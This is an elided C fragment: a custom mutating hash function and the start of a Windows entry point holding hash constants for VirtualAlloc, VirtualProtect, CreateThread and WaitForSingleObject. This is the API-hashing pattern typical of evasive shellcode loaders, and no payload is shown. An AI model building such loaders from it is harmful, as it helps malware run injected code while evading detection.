...
uint64_t hash(const uint8_t *data, size_t len) {
    ...
    uint64_t dynamic_prime = 0x100000001b3ULL;
    ...
    for (size_t i = 0; i < len; i++) {
        ...
        dynamic_prime = dynamic_prime + c_val + (h >> 32);
        dynamic_prime |= 1; 
    }
...
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0x9B22D471;
    uint32_t h_VirtualProtect = 0xF0A748F9;
    uint32_t h_CreateThread = 0x2600F53;
    uint32_t h_WaitForSingleObject = 0x2B1BA28E;
